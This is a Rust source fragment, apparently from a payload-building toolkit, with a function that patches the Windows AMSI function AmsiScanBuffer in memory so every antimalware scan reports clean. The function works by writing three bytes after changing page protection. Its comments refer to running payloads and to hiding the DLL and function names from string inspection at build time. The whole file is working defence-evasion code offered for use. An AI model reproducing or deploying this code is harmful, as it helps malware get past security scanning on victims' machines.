// --- AMSI patch (technique fragment) ---

use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{
    VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
};

/// Errors produced while patching the scan function.
#[derive(Debug, thiserror::Error)]
pub enum PatchAmsiError {
    #[error("failed to load the library to patch")]
    LoadFailed,
    #[error("failed to resolve the function to patch")]
    ResolveFailed,
    #[error("failed to make the target function writable")]
    MakeWritableFailed,
    #[error("failed to restore the target function protection")]
    RestoreProtectionFailed,
}

/// Patches `AmsiScanBuffer` in the current process so it always returns `S_OK`.
///
/// The patch is `sub eax, eax; ret` (`29 C0 C3`): it zeroes EAX (S_OK) and
/// returns immediately, so any AMSI scan reports "clean". It only affects the
/// current process; if the payload later runs in another process (e.g. process
/// hollowing), that process's AMSI is not patched here.
///
/// The DLL and function names are substituted at build time by
/// `Params::render_fragment` with code that rebuilds them at runtime, so they
/// do not appear in `strings`.
pub fn patch_amsi() -> Result<(), PatchAmsiError> {
    let amsi_dll = std::ffi::CString::new(AMSI_DLL_DEF).map_err(|_| PatchAmsiError::LoadFailed)?;
    let func_name =
        std::ffi::CString::new(AMSI_FUNC_DEF).map_err(|_| PatchAmsiError::LoadFailed)?;

    // 1. Load amsi.dll (a no-op if it is already loaded).
    let module = unsafe { LoadLibraryA(PCSTR(amsi_dll.as_ptr() as *const u8)) }
        .map_err(|_| PatchAmsiError::LoadFailed)?;

    // 2. Resolve AmsiScanBuffer.
    let address = unsafe { GetProcAddress(module, PCSTR(func_name.as_ptr() as *const u8)) };
    let address = address.ok_or(PatchAmsiError::ResolveFailed)?;
    let target = address as usize as *mut u8;

    // 3. Make the first three bytes writable.
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    unsafe {
        VirtualProtect(
            target as *const core::ffi::c_void,
            3,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    }
    .map_err(|_| PatchAmsiError::MakeWritableFailed)?;

    // 4. Write `sub eax, eax; ret`.
    unsafe {
        *target = 0x29;
        *target.add(1) = 0xC0;
        *target.add(2) = 0xC3;
    }

    // 5. Restore the original protection.
    unsafe {
        VirtualProtect(
            target as *const core::ffi::c_void,
            3,
            old_protect,
            &mut old_protect,
        )
    }
    .map_err(|_| PatchAmsiError::RestoreProtectionFailed)?;

    Ok(())
}
